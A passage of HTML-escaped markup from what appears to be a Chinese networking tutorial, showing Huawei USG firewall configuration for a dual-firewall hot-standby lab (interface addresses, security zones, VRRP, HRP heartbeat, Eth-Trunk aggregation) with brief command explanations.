class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/3]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/0]ip address 192.168.1.2 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/2]ip address 20.1.1.2 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int g1/0/3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/3]ip address 10.1.1.2 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/3]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;2.然后配置防火墙的安全区域&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG1]firewall zone trust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-trust]add interface g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]firewall zone untrust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-untrust]add interface g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-untrust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]firewall zone dmz 	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-dmz]add interface g1/0/3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-dmz]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG2]firewall zone trust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-trust]add interface g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]firewall zone untrust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-untrust]add interface g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-untrust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]firewall zone dmz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-dmz]add interface g1/0/3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-dmz]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;3.然后开始配置防火墙双机热备&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#配置虚拟IP，即备份组IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/0]vrrp vrid 1 virtual-ip 192.168.1.254 24 active &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 active &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#绑定心跳口，注意端口和ip不要弄混淆，本设备配置端口和远程设备对应端口的ip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]hrp interface g1/0/3 remote 10.1.1.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#开启hrp备份&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]hrp enable&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/0]vrrp vrid 1 virtual-ip 192.168.1.254 24 standby&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 standby &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG2]hrp interface g1/0/3 remote 10.1.1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]hrp enable&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;hr&gt;
&lt;p&gt;4.在FW1上配置安全策略，会同步备份至FW2，写一个安全策略进行验证&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1]security-policy (+B)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security]rule name 1 (+B)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security-rule-1]source-zone trust  (+B)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security-rule-1]destination-zone untrust  (+B)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security-rule-1]action permit  (+B)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security-rule-1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;最后将FW1关闭，可以发现PC1和PC2依旧可以通过FW2进行通信&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;具体命令详解&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[USG1-GigabitEthernet1&amp;#x2F;0&amp;#x2F;0]vrrp vrid 1 virtual-ip 192.168.1.254 24 active&lt;br&gt;[USG1-GigabitEthernet1&amp;#x2F;0&amp;#x2F;2]vrrp vrid 2 virtual-ip 20.1.1.254 24 active &lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;配置FW1接口GigabitEthernet0&amp;#x2F;0&amp;#x2F;1的VRRP备份组1，并加入到状态为Active的VGMP管理组。&lt;/p&gt;
&lt;p&gt;配置FW1接口GigabitEthernet0&amp;#x2F;0&amp;#x2F;2的VRRP备份组2，并加入到状态为Active的VGMP管理组。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;vrrp: 表示我们正在配置 VRRP。&lt;/li&gt;
&lt;li&gt;vrid 1: VRRP 虚拟路由器标识符（VRID）是唯一的，用于标识一个 VRRP 组。在这里，VRID 是 1。&lt;/li&gt;
&lt;li&gt;virtual-ip 192.168.1.254 24: 这部分配置指定了虚拟 IP 地址（VIP）及其子网掩码。在这里，VIP 是 192.168.1.254，子网掩码的长度是 24（等同于 255.255.255.0）。这个 IP 地址不会分配给任何物理接口，而是作为整个 VRRP 组的虚拟地址，当主路由器工作时，它将成为该组的默认网关。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;active（主模式）或 standby（备份模式）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;active&lt;/code&gt;: 这表示该路由器是 VRRP 组中的主路由器（也称为 master）。在 VRRP 中，路由器可以是主路由器（负责转发数据）或备份路由器（在主路由器故障时接管）。当设置为 &lt;code&gt;active&lt;/code&gt; 时，路由器将尝试成为主路由器。然而，在真实配置中，通常会根据优先级来决定谁是主路由器，而不是直接指定为 &lt;code&gt;active&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实验拓扑图二：&#34;&gt;&lt;a href=&#34;#实验拓扑图二：&#34; class=&#34;headerlink&#34; title=&#34;实验拓扑图二：&#34;&gt;&lt;/a&gt;实验拓扑图二：&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-11%20100338.png&#34; alt=&#34;屏幕截图 2024-05-11 100338&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;实验过程：-1&#34;&gt;&lt;a href=&#34;#实验过程：-1&#34; class=&#34;headerlink&#34; title=&#34;实验过程：&#34;&gt;&lt;/a&gt;实验过程：&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.首先对FW1和FW2进行配置，对心跳口进行链路聚合&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int Eth-Trunk 18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-Eth-Trunk18]mode lacp-static&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-Eth-Trunk18]max active-linknumber 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-Eth-Trunk18]trunkport g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-Eth-Trunk18]trunkport g1/0/3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-Eth-Trunk18]trunkport g1/0/4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int Eth-Trunk 18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-Eth-Trunk18]mode lacp-static&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-Eth-Trunk18]max active-linknumber 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-Eth-Trunk18]trunkport g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-Eth-Trunk18]trunkport g1/0/3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-Eth-Trunk18]trunkport g1/0/4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;2.然后配置相关端口ip&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/1]ip address 192.168.1.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/2]ip address 20.1.1.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int Eth-Trunk 18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-Eth-Trunk18]ip address 10.1.1.1 30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-Eth-Trunk18]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/1]ip address 192.168.1.2 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/2]ip address 20.1.1.2 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int Eth-Trunk 18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-Eth-Trunk18]ip address 10.1.1.2 30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-Eth-Trunk18]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;3.然后配置划分安全区域&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG1]firewall zone trust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-trust]add interface g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]firewall zone untrust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-untrust]add interface g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-untrust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]firewall zone dmz &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-dmz]add interface Eth-Trunk 18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-zone-dmz]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG2]firewall zone trust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-trust]add interface g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]firewall zone untrust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-untrust]add interface g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-untrust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]firewall zone dmz &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-dmz]add interface Eth-Trunk 18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-zone-dmz]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;4.然后开始配置hrp备份&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
